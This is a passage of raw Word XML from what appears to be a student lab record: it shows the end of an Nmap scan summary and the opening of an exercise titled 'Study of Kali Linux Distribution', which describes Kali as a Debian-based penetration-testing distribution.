        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>48</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>cf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>60</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>57 (Conn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>S)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>done:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1 IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>address (1 host</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>up) scanned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n 0.37 seconds</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sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="16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100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 14a                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2574"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>UDY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ALI L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">NUX </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>IS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>RIBU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="102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20" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8930"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>udy about</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nux:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>advanced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ecu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>y aud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nux</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>bu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="288" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="72" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Deb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>an-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>advan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and Secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>ud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sever</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hundred</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>asks,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
